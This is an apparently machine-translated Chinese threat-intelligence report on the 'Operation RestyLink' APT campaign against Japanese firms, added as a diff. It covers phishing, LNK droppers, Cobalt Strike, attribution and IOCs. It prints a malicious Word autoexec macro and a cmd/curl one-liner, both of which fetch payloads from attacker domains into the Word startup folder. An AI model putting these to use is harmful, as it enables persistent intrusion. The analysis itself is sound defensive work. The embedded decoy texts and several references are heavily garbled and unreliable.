@@ -1,0 +1,269 @@
+# Operation RestyLink：针对日本公司的 APT活动  
+
+日吉龙,  
+
+2022年5月13日  
+
+本文为《Operation RestyLink：日本企业狙标的型攻撃－》的译文。  
+
+今天的文章由我们的SOC分析师RintaroKoike撰写。  
+
+我们的SOC观察到从2022年4月中旬开始针对日本公司的APT活动。我们认为该活动已于2022年3月开始，相关攻击可能在2021年10月左右进行。这意味着该活动不是暂时的或密集的，它可能从这里继续前进。  
+
+在本文中，我们报告了对这次活动的详细分析，并讨论了攻击组的属性。  
+
+## 攻击概述  
+
+我们在2022年4月中旬观察到的攻击如下：  
+
+  
+
+一旦用户访问了鱼叉式网络钓鱼电子邮件中的URL，就会从攻击者操作的服务器下载一个ZIP文件。执行ZIP文件中包含的LNK文件后，会使用Windows命令从服务器下载一个DOT文件，并将其放置在Microsoft Word 启动文件夹中。在此阶段，会显示诱饵PDF文件以吸引用户注意。  
+
+每当用户打开Word文件时，都会加载Startup文件夹中的DOT文件并执行嵌入的宏。然后宏从服务器下载另一个DOT文件并执行该文件。但是，我们在研究时无法下载此DOT文件。  
+
+## 详细分析  
+
+### LNK文件  
+
+LNK 文件的图标图像是PDF文件，但它使用 ScriptRunner.exe 执行以下任务：  
+
+1.显示诱饵PDF文件。  
+
+2.下载DOT文件并将其放在Microsoft Word 启动文件夹中。  
+
+有两个诱饵PDF文件，都是关于日韩关系的。编辑部分包含真实的人名。  
+
+# 参加申書  
+
+束の国際開係及韩開係の未来形式：WebexMeetings日時：2022年6月23日（木）13：50  
+
+  
+
+贵社名：  
+部署/御役名：  
+二氏名：  
+電話番号：  
+
+# 二贺間·二意见  
+
+申、一3日前（土日·祝除<）书原致主寸。\*WEB配信：用催2日前、視用URL书送L主寸。記入加UR送寸。  
+欠席方、返信<精椿寸。  
+事由、合。【WEB配信加]  
+·宁才会籍义一「Mebex Meetings」在使走EB配信以生。  
+境、y、简单加止计主寸。利用璟境民比通信料力办場合苏主寸。通信料比参加者株の負担）  
+·惠用URL注原则、開催2日前招送Dt交L求式。《土日祝查注七场合注、前日比送寸楊合二主寸）  
+·绿音、绿画注二速虚<  
+·当日、講演会用始前事務局上、映像·音声民支障办董都末。時同辽余裕含T二人室<》。  
+·二聊、速营上の開保、贺疑志答の前主（二错演）格了本主。置周方、事前一格送<。  
+但人情報取报  
+二提供人情报，整所、释济安全保障一の谨营为使  
+
+# 日韩文化交流基金東情勢交流会の開催  
+
+口韩開の5橘良、「韩开係の姿、日本韓国の分野年携来門家記者招講演行。日韩のの特微基国間の保完の可能性考機会思。  
+
+主、收主米中摩擦、北朝鲜の周题聚張感增寸中、束含世界勤<の。今回の交流会、国内外の專門家記者招、Webex通束国开、韓开保の未来深<羲上考之了主寸。  
+
+1 日时 2022年6月23日（木）1 $4:00{-}16:30$   
+2 開催場所 才(WebexMeetings)  
+3 申达方法 参加希望方、申参照申  
+<龙  
+4 参加费 料  
+
+### 点文件  
+
+每当用户打开 Word 文件时，都会加载位于 Startup 文件夹中的 DOT 文件。DOT 文件中嵌入的宏如下：  
+
+Sub autoexec()   
+On Error Resume Next   
+If ThisDocument.XMLSaveThroughXSLT <> Day(Now)  Then   
+ThisDocument.XMLSaveThroughXSLT = Day(Now)   
+Application.Documents.Open "http://resource.officehoster.com/w" + Environ   
+("username") + "w.dot", Visible:=0   
+ThisDocument.Save   
+End If   
+End Sub  
+
+宏下载另一个DOT文件并执行该文件。攻击者在这个阶段已经有了用户环境信息，因为用户名包含在目标文件名中。我们在研究期间无法下载此DOT文件。  
+
+## 相关攻击和事件  
+
+### 2022年4月下旬的攻击案例  
+
+在 2022 年4月下旬，我们确认可以从上一节中讨论的相同基础架构下载ISO 文件。攻击向量如下。  
+
+  
+
+除了诱饵文件外，ISO文件还包括一个合法的MicrosoftWordEXE文件和一个恶意DLL文件。DLL文件将在执行EXE文件时被旁加载和执行。  
+
+DLL 文件是一个 UPX 打包的 Golang 下载器。DLL 文件从服务器下载 Cobalt StrikeStager并执行该文件。攻击者使用Cobalt Strike 提供的各种命令调查环境。  
+
+执行的Cobalt StrikeStager使用的Config文件如下：  
+
+  
+
+### 2022年4月上旬相关事件  
+
+在2022年4月上旬，我们观察到对用于讨论活动的基础设施（IP地址）的出站访问。细节未知，但我们怀疑这种访问是考虑到攻击目标、时期和基础设施的讨论活动的一部分。  
+
+### 2022年3月相关事件  
+
+一个有趣的LNK 文件与讨论活动中使用的LNK 文件具有相似的特征，该文件于 2022年3月从日本发布到VirusTotal。  
+
+C:\windows\system32\cmd.exe /c explorer https://6bfeeb71c.disknxt.com/ VmpJd01wwXlSb1JTYWsw/研修会案内.pdf & mkdir %appdata%\Microsoft\Word\STARTUP & curl -0 %appdata%\Microsoft\Word\STARTUP\f.dot https://6bfeeb71c.disknxt.com/ 1JTYwsw/annak.docx  
+
+该示例使用cmd.exe 而不是ScriptRunner.exe，但执行的命令和使用的攻击基础结构是相同的。使用此LNK文件的攻击很可能是讨论活动的一部分。  
+
+在我们研究的时候，我们无法获得第一个 DOT文件。诱饵PDF文件是关于日本在东亚的外交。  
+
+# 日本記者記者研修会  
+
+# 参加申書  
+
+問題張感增中、世界動の。  
+
+中国·北朝の軍事力增强仁对、日米同盟轴仁新安全保障の組自主防衛力—。  
+
+衆院秉切、对策「新济政策」等の公約实現迫。  
+
+岸田政凳足5月余。  
+
+  
+
+二貨周·二意见  
+
+長年、国内外の政治释济取材講師陣锐視点飞解说儿寸。  
+
+书申L、x一3日前（土日·祝除<）主飞民顾致L寸。\*WEB配信：用催2日前、視聘用のURL书送L主寸。記人参加URL送寸。  
+席方、返信<结構主。  
+由、場合。[EB信加]  
+比才会践义一「Webex Meetings]在使oWEB配信》主寸。  
+境、简单表加主产主。（利用最境仁际通信料办办为摄合求末式。通信料注参加者·視用URL注原则、開催2日前指送VL定寸。（土日祝交比提合过、前日仁括送場合寸。)  
+·绿音、绿面社二速道<龙。  
+·当日、演会用始前事務局，映像·音声v支障办限主寸。時余裕室<  
+，二罐、運营上保、置疑店答前主（罐演）签了主寸。置周D为方、事前一送<。  
+固人情報取报  
+提供调人情帮、整所、济安全保障の理使用、事局保万全期、本人の同意事局  
+
+### 2022年1月相关事件  
+
+在 2022年 4月下旬的攻击案例中使用的Golang下载器使用奇怪的User-Agent从"/Events"下载了Cobalt Strike Stager。这个用户代理是Yandex浏览器的用户代理，这在日本并不常见。我们发现一个具有相同特征的样本于2022年1月从日本发布到VirusTotal。由于它们的基础设施有相似之处，因此该事件也可能与讨论活动有关。  
+
+Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ 87.0.4280.60 YaBrowser/22.12.0.966 Yowser/2.5 Safari/537.36  
+
+在调查其他子域对应的iP地址时，我们发现了Covenant这个开源C2框架的踪迹。除了CobaltStrike，攻击者可能还使用了Covenant。  
+
+<html><body><table><tr><td>// 7443 / TCP</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td>-2106581855 2022-04-12T05:24:36.256506</td></tr></table></body></html>  
+
+HTTP/1.1 200 0K   
+Date:Tue,12 Apr 2022 05:24:35 GMT   
+Content-Type: text/html: charset=utf-8   
+Server:Kestrel   
+Transfer-Encoding:chunked  
+
+# SSL Certificate  
+
+Certificate: Data: Version: 3 (0x2) SerialNumber:5294099935578943392 (0x49786bd79199efa0) Signature Algorithm: sha256WithRSAEncryption Issuer: CN=Covenant Validity Not Before: Apr 11 03:00:55 2022 GMT Not After:Apr 9 03:00:55 2032 GMT Subject: CN=Covenant Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (2048 bit)  
+
+### 2021年11月相关事件  
+
+2021年11月注册的domain differentfor[.]com与2022年1月和 4月下旬观察到的Cobalt Strike 活动有关。由于其基础架构、域、文件路径、HTTP 标头和 Cobalt StrikeConfig与讨论活动的相同，它可能与竞选活动有关。  
+
+  
+
+### 2021年10月相关事件  
+
+在我们对这次攻击活动的研究中，我们发现使用类似攻击基础设施的攻击可能在2021年10月下旬进行。  
+
+在我们进行研究时，我们无法获得此次攻击中使用的文件。但是，恶意文件可能已从伪装成SASAKAWAUSA的Web服务器下载。  
+
+  
+
+  
+
+| Event Details  
+
+# DETAILS  
+
+Date: November.2.2021 Time: 9:00 am-10:15pm Event Category: Policy Briefng Series Event Tags: jgsdf,Taiwan,usjapan cooperation  
+
+To download as a PDF, please click here.  
+
+On Tuesday,November 2, 2021, Sasakawa Peace Foundation USA (Sasakawa USA)hosted a virtual event,“Taiwan Crisis and Japan's Strategy" featuring remarks by Lieutenant General Koichiro Bansho,Japan Ground Self-Defense Force(JGSDF) (Ret.), who served as the Commander of theWesternArmyof Japan from 2013 to 2015.He wasjoined bycommentator LieutenantGeneral Wallace\*Chip"Gregson,United States Marine Corps (USMC) (Ret.), who was the Assistant Secretary of Defense for Asian and Pacific Security Affairs from 2009 to 2011. LTG Bansho discussed Japon's recent efforts to strengthen cdefense near Taiwan and the surrouncling areas,how Japan would act ina potential Taiwan crisis ways to improve Japan-U.S-Taiwan trilateral relations, and how Japan and the United States can collborate to ensure security in theregion.  
+
+## 归因  
+
+下图总结了我们发现的与讨论活动相关的特征  
+
+  
+
+有各种特点，但我们应该注意的是，这场运动显然是针对日本的。攻击者仔细选择目标用户，准备用自然日语编写的诱饵文件并利用日语IP地址。很明显，日本不是偶然被攻  
+
+击的，攻击者攻击日本的积极性很高。此次活动中使用的Web服务器的访问权限可能基于地质信息而受到限制，这表明攻击者的谨慎和狡猾。因为只有少数APT团体有能力和动机攻击日本，候选APT团体是有限的。  
+
+根据我们的研究，我们想列出四个我们认为与此活动相关的APT组。考虑到本文未提及的其他琐碎信息，我们认为DarkHotel是撰写本文时最强的嫌疑人。由于没有令人信服的证据，这一假设可能会根据未来的研究而改变。  
+
+### 黑暗酒店  
+
+DarkHotel是一个据说归因于韩国［1］的APT组织，他们的攻击在日本相当频繁地观察到[2][3][4][5][6]。他们不断攻击日本媒体公司或智库。他们使用日本电子邮件和诱饵文件执行鱼叉式网络钓鱼攻击，使用LNK文件执行多级下载程序和加载程序。基于这些特征的相似性，我们怀疑DarkHotel与讨论活动有关。  
+
+### 金苏基  
+
+Kimsuky是一个APT组织，据说归因于朝鲜[7]，他们的攻击有时在日本被观察到［8][9]。据说金秀基的目标是朝鲜难民和相关组织，但日本媒体公司过去也曾成为目标。据报道，他们在最近的攻击中使用了LNK文件[10]。这些特征与讨论活动有几个共同点。  
+
+### APT29  
+
+APT29是一个APT组织，据说归因于俄罗斯[11]，他们的攻击在日本很少报道。然而，最近的乌克兰局势可能会促使他们攻击日本。据报道，APT29在攻击中使用了LNK[12] 或ISO文件[13]。它们也被称为利用Cobalt Strike[14] 或 Golang恶意软件[15]。这些特征与讨论活动有一些共同点。  
+
+### TA416  
+
+TA416是一个APT组织，据说归因于中国[16]，并且在日本有时会观察到这些攻击。众所周知，TA416 使用 LNK 文件或Cobalt Strike[17][18]。这些特征与讨论活动有相似之处。  
+
+## 结论  
+
+截至2022年4月，已观察到针对日本公司的APT活动。尽管我们命名了几个可以在竞选活动背后活跃的候选APT团体，但没有明确的证据表明是哪一个。由于类似的攻击可能已经进行了几个月，因此有必要持续监控情况。  
+
+### IOC  
+
+. \*disknxt[.]com \*.officehoster[.]com \*.youmiuri[.]com \*.spffusa[.]org \*.sseekk[.]xyz \*.mbusabc [.] com \*.differentfor [.] com 103[.]29.69.155 149[.]28.16.63 172[.]104.122.93 172[.]105.229.93 172[.]105.229.216 207[.]148.91.243 45[.]77.179.110  
+
+## 参考  
+
+[1] MITRE ATT&CK，"黑暗旅馆"， https: //attack.mitre.org/groups/GO012/  
+
+[2]·ジ，"含 攻c/の先"，https://nttight-10  
+
+[3]JPCERT/CC，“攻击说服用户下载包含恶意软件的快捷方式文件"，https:/blogs.jpcert.or.jp/en/2019/06/darkhotel-lnk.html  
+
+[4]二力，“标的型攻撃の态对策口一于第3版"，https: //www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_repo rt_2019_2_nopw.pdf  
+
+[5] Macnica Networks Crop.，"2020 年日本 APT 威胁形势"，https://www.macnica.co.jp/business/security/manufacturers/files/mpressioncss_ta_report_2020_5_en.pdf  
+
+[6]IPA，"サ一一队（J-CRAT）活动状况[2019年度下半期]",https://www.ipa.go.jp/files/000083013.pdf  
+
+[7] Mandiant，“Not SoLazarus：将朝鲜网络威胁组织映射到政府组织",https://www.mandiant.com/resources/mapping-dprk-groups-to-government  
+
+[8]IPA，“サ一一队（J-CRAT）活动状况[2021年度上半期]",https://www.ipa.g0.jp/files/000094548.pdf  
+
+[9] Cybereason，“回到未来：Kimsuky KGH 间谍软件套件内部"，https ://www.cyberason.com/blog/research/back-to-the-future-inside-the-kimsuky-kghspyware-套房  
+
+[10] 楼梯间，"GOLDBACKDOOR 的墨迹"， https ://stairwell.com/news/threatresearch-the-ink-stained-trail-of-goldbackdoor/  
+
+[11] MITRE ATT&CK, "APT29", https: //attack.mitre.org/groups/G0016/  
+
+[12] Volexity，“疑似 APT29 行动发起以选举欺诈为主题的网络钓鱼活动"，https: //www.volexity.com/blog/2021/05/27/suspected-apt29-operation-launcheselection-fraud-themed-phishing -活动/  
+
+[13]微软，“分解NOBELIUM最新的早期工具集"，   
+https://www.microsoft.com/security/blog/2021/05/28/driving-down-nobeliums  
+latest-early-stage-toolset/  
+
+[14] Mandiant，“不太舒服：对疑似 APT29 网络钓鱼活动的令人不安的检查"，https: //www.mandiant.com/resources/not-so-cozy-an-uncomfortable-examination-of-asuspected-apt29-网络钓鱼活动  
+
+[15]JPCERT/CC，“针对 Linux 和 Windows 的恶意软件"WelIMess"，https:/blogs.jpcert.or.jp/en/2018/07/malware-wellmes-9b78.html  
+
+[16]Proofpoint，“好的、坏的和网络漏洞：随着乌克兰冲突升级，TA416 加快了针对 欧洲政府的行动节奏"， https ://www.proofpoint.com/us/blog/threat-insight/good - bad-and-web-bug-ta416-increases-operational-tempo-against-european  
+
+[17] CrowdStrike，"遇见CrowdStrike 6月份的当月对手：MUSTANG PANDA", https : //www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-monthfor-june-mustang-panda /  
+
+[18]思科，“野马熊猫部署新一波针对欧洲的恶意软件”，https://blog.talosintelligence.com/2022/05/mustang-panda-targets-europe.html  
